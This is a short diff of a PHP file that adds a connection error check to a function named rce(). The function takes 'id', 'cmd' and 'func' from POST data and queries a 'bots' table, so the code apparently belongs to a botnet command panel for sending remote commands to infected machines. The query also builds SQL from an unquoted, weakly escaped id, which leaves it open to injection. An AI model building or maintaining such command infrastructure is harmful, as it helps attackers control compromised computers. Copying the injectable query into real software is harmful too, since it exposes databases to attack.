@@ -415,7 +415,16 @@ echo '<p>'.$quote.'</p>';
 
 function rce()
 {
+	// Create Connection
 	$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+	
+	
+	// Check connection
+	if ($conn->connect_error) {
+    	die("Connection failed: " . $conn->connect_error);
+	} 
+
+
 	if(isset($_POST['id']) && isset($_POST['cmd']) && isset($_POST['func'])) {
 		$check = mysqli_query($conn, "SELECT * FROM `bots` WHERE `id` = " . mysql_escape_string($_POST['id']) . " LIMIT 1");
 		$row = mysql_fetch_array($check);
